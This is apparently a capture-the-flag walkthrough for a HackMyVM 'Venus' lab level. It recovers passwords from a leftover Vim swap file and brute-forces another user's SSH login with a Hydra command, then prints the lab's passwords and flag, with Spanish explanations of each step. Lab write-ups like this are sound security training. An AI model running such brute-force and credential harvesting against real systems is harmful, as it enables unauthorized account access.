### Level Goat
Seems that ariel dont save the password for lola, but there is a temporal file.
### User
**ariel**
### Credentials
ssh hacker@venus.hackmyvm.eu -p 5000
pass: **havefun!**
### Solution
```shell
TERMINAL 1

ariel@venus:~$ ls -la
total 44
drwxr-x--- 2 root  ariel  4096 Jul 26 08:54 .
drwxr-xr-x 1 root  root   4096 Jul 26 08:53 ..
-rw-r--r-- 1 ariel ariel   220 Apr 23 21:23 .bash_logout
-rw-r--r-- 1 ariel ariel  3526 Apr 23 21:23 .bashrc
-rw-r----- 1 root  ariel 12288 Jul 26 08:54 .goas.swp
-rw-r--r-- 1 ariel ariel   807 Apr 23 21:23 .profile
-rw-r----- 1 root  ariel    31 Jul 26 08:53 flagz.txt
-rw-r----- 1 root  ariel   254 Jul 26 08:53 mission.txt
ariel@venus:~$ 
ariel@venus:~$ cat .goas.swp 
k�����}jWD1pad�eb11~teste/goas
           �������snmk[K;qkBjHcaJqkBjHcaJqkBjHcaJ-->VVjqJGRrnfKmcgD-->bnQgcXYamhSDSff-->QsymOOVbzSaKmRm-->cbjYGSvqAsqIvdg-->LkWReDaaLCMDlLf-->DabEJLmAbOQxEnD-->mYhQVLDKdJrsIwG-->d3LieOzRGX5wud6-->EKvJoTBYlwtwFmv-->PEOppdOkSqJZweH-->rSkPlPhymYcerMJ-->GBUguuSpXVjpxLc-->NdnszvjulNellbK-->IaOpTdAuhSjGZnu-->RGBEMbZHZRgXZnu--rxhKeFKveeKqpwp-->cOXlRYXtJWnVQEG-->ppkJjqYvSCIyAhKThats my little DIc with my old and current passw0r

ariel@venus:~$ file .goas.swp 
.goas.swp: Vim swap file, version 8.2, pid 2299, user teste, host deb11, file ~teste/goas, modified
ariel@venus:~$ 

ariel@venus:~$ vim -r .goas.swp 
ariel@venus:~$ cd /tmp/omsi/      

ariel@venus:~$ cat /tmp/omsi                                                                                                                 
Thats my little DIc with my old and current passw0rds:                                                                  
-->ppkJjqYvSCIyAhK
-->cOXlRYXtJWnVQEG
--rxhKeFKveeKqpwp
-->RGBEMbZHZRgXZnu
-->IaOpTdAuhSjGZnu
-->NdnszvjulNellbK
-->GBUguuSpXVjpxLc
-->rSkPlPhymYcerMJ
-->PEOppdOkSqJZweH
-->EKvJoTBYlwtwFmv
-->d3LieOzRGX5wud6
-->mYhQVLDKdJrsIwG
-->DabEJLmAbOQxEnD
-->LkWReDaaLCMDlLf
-->cbjYGSvqAsqIvdg
-->QsymOOVbzSaKmRm
-->bnQgcXYamhSDSff
-->VVjqJGRrnfKmcgD


TERMINAL 2

┌──(kali㉿kali)-[~]
└─$ hydra -l lola -P list venus.hackmyvm.eu -s 5000 ssh

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-02 23:48:42
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 18 login tries (l:1/p:18), ~2 tries per task
[DATA] attacking ssh://venus.hackmyvm.eu:5000/
[5000][ssh] host: venus.hackmyvm.eu   login: lola   password: d3LieOzRGX5wud6
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-02 23:48:52
                                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ 



TERMINAL 1

ariel@venus:~$ su lola
Password: 
lola@venus:/pwned/ariel$ cd ~
lola@venus:~$ cat flagz.txt 
8===TMYRw853hx8yKRocFMgM===D~~
lola@venus:~$ 

```
### Summary

### .swp
Un archivo con la extensión ".goas.swp" es un archivo de intercambio (swap) creado por el editor de texto Vim.

Cuando estás editando un archivo con Vim, se crea un archivo de intercambio con la extensión ".swp" para almacenar temporalmente los cambios que aún no se han guardado en el archivo original. El archivo de intercambio se utiliza como una medida de seguridad en caso de que ocurra algún fallo o cierre inesperado del editor.

Es importante destacar que los archivos de intercambio (.swp) generados por Vim son archivos temporales y no deberían ser compartidos o versionados, ya que están destinados a ser utilizados solo por el editor Vim.

el comando vim tiene una opción -r para restaurar estos archivos temporales 

### hydra
El comando "[hydra](https://www.google.com/search?q=hydra)" es una herramienta de línea de comandos en Linux que se utiliza para realizar ataques de fuerza bruta o de diccionario en diversos servicios y protocolos de red.

En el comando específico "[hydra -l lola -P list venus.hackmyvm.eu -s 5000 ssh](https://www.google.com/search?q=hydra%20-l%20lola%20-P%20list%20venus.hackmyvm.eu%20-s%205000%20ssh)", se está utilizando hydra para atacar el servicio SSH en el servidor "[venus.hackmyvm.eu](https://www.google.com/search?q=venus.hackmyvm.eu)". Veamos qué hace cada parte del comando:

- "[hydra](https://www.google.com/search?q=hydra)": Es el nombre del comando utilizado para ejecutar la herramienta Hydra.
- "[-l lola](https://www.google.com/search?q=-l%20lola)": Especifica el nombre de usuario a utilizar en el ataque. En este caso, el nombre de usuario es "lola".
- "[-P list](https://www.google.com/search?q=-P%20list)": Especifica el archivo de lista de contraseñas a utilizar en el ataque. En este caso, se está utilizando un archivo llamado "list" que contiene las contraseñas a probar.
- "[venus.hackmyvm.eu](https://www.google.com/search?q=venus.hackmyvm.eu)": Es el objetivo del ataque, es decir, el servidor al que se está intentando acceder.
- "[-s 5000](https://www.google.com/search?q=-s%205000)": Especifica el puerto a utilizar en el ataque. En este caso, se está utilizando el puerto 5000.
- "[ssh](https://www.google.com/search?q=ssh)": Indica el protocolo o servicio que se está atacando. En este caso, se trata del servicio SSH.

En resumen, este comando de Hydra intentará realizar un ataque de fuerza bruta al servicio SSH en el servidor "[venus.hackmyvm.eu](https://www.google.com/search?q=venus.hackmyvm.eu)" utilizando el nombre de usuario "lola" y una lista de contraseñas especificada en el archivo "list". La opción "[-s 5000](https://www.google.com/search?q=-s%205000)" indica que el ataque se realizará en el puerto 5000. Es importante destacar que realizar un ataque de fuerza bruta sin permiso es ilegal y éticamente incorrecto.